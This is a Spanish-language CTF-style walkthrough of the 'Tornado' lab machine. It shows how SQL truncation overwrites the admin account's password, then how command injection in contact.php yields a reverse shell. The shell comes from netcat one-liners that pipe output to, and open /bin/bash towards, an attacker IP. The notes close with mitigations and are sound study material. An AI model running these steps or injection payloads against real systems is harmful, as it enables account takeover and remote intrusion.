
# 🧠 Ataque de Truncado SQL (SQL Truncation)

El ataque de **SQL Truncation** explota el hecho de que algunos servidores de bases de datos o aplicaciones web **limitan la longitud de ciertos campos**, como `username` o `email`, **truncando** (cortando) los datos que exceden ese límite. Esta técnica puede ser usada, por ejemplo, para **suplantar cuentas de administradores**, sobrescribiendo sus credenciales al aprovechar dicho truncamiento.

---

## 🎯 Concepto clave

> Si una aplicación impone un límite de longitud (por ejemplo, 13 caracteres para el campo "email"), y el servidor **trunca el input en lugar de rechazarlo**, podemos explotar esta discrepancia para modificar usuarios ya existentes.

---

## 🧪 Parte práctica — Máquina *Tornado*

---

### 🛰️ Enumeración inicial

Escaneamos la red para encontrar la IP de la máquina víctima:

```sh
arp-scan -I <interfaz> --localnet --ignoredups
```

Una vez detectada, realizamos **fuzzing de directorios** con [[gobuster]]:

```sh
gobuster dir -u http://<ip> -w <diccionario> -t 20
```

📁 Encontramos la ruta `/bluesky/`.

Buscamos archivos `.php`:

```sh
gobuster dir -u http://<ip>/bluesky -w <diccionario> -t 20 -x php
```

Hallamos dos archivos importantes:

- `login.php`
    
- `signup.php` ← **interesante para analizar validaciones**
    

---

### 🔐 Signup con validación vulnerable

En `signup.php`, notamos que el input de correo tiene una **longitud máxima de 13 caracteres**. Probamos crear un usuario legítimo con:

- `email: prueba123@tst`
    
- `contraseña: test123`
    

Al registrarnos, el home muestra que el _LFI ha sido parcheado_, pero al ver el código fuente (`Ctrl + U`) aparece una **ruta completa**:

> `/home/tornado`

---

### 🧭 Exploración con ~/

Sabemos que en servidores Apache, la ruta `~/usuario/` hace referencia a `/home/usuario`.

```http
http://<ip>/~/tornado/
```

Navegando ahí encontramos un archivo:

```txt
imp.txt
```

![[Pasted image 20250509041206.png]]

🔎 Contiene **una lista de correos** como `admin@tornado`, `ceo@tornado`, etc., que nos dan nombres de usuarios importantes.

---

### 💣 Ataque de truncado SQL

Supongamos que el servidor trunca los campos a 13 caracteres exactos. El correo `admin@tornado` tiene **13 caracteres justos**.

Si intentamos registrarnos con ese correo, fallará por estar registrado. Pero si **modificamos el HTML desde el navegador** para permitir más caracteres, podemos hacer esto:

```txt
email: admin@tornado  a
clave: hacked
```

📌 Al enviarlo, el servidor **truncará el email a los primeros 13 caracteres** (`admin@tornado`) y actualizará el usuario existente, ¡cambiando la contraseña del administrador a `hacked`!

---

## 🛠️ Acceso al panel admin

Desde el panel admin, encontramos una sección **"Contact"**, que apunta a `contact.php`. Aparentemente, permite ejecutar comandos con `exec()` en PHP.

---

### 🎧 Reverse Shell (sin visibilidad)

La ejecución no retorna salida en el frontend, pero podemos usar **Netcat** para capturarla desde nuestra máquina atacante:

```sh
nc -nlvp 443
```

Y en el campo del `POST` coment de `contact.php`, enviamos:

```sh
test; whoami | nc <ip_atacante> 443
```

✅ Vemos que el output es `www-data`.

---

### 🐚 Shell interactiva

Ahora podemos obtener acceso a shell directamente:

```sh
test; nc -e /bin/bash <ip_atacante> 443
```

Y si necesitamos un entorno TTY usable:

```sh
script /dev/null -c bash
```

---

## 📄 Código vulnerable (`contact.php`)

```php
$cmd = $_POST['comment'];
echo $cmd;
exec($cmd);
```

> ❗ ¡Claramente vulnerable a ejecución remota de comandos!

---

## 🧷 Resumen

| Paso                      | Descripción                    |
| ------------------------- | ------------------------------ |
| Descubrimiento de IP      | Escaneo ARP                    |
| Fuzzing de rutas          | Gobuster                       |
| Detectar límite en signup | Longitud de input = 13         |
| Truncado de correo        | Se sobrescribe `admin@tornado` |
| Reverse shell             | `exec()` + Netcat              |

---

## 🚨 Mitigaciones recomendadas

- Validar longitudes de campos **tanto del lado cliente como servidor**.
    
- No truncar silenciosamente: **rechazar entradas largas** explícitamente.
    
- En bases de datos, asegurar unicidad y uso de `BINARY` si aplica (MySQL).
    
- Nunca ejecutar directamente entradas del usuario (`exec()` sin sanitizar).
    

---

## 🧷 Tags

#sqltruncation #ciberseguridad #vulnerabilidades #web #php #netcat #reverse_shell #fuzzing #apache #exploit

[[OWASP]]
[[gobuster]]
[[netcat]]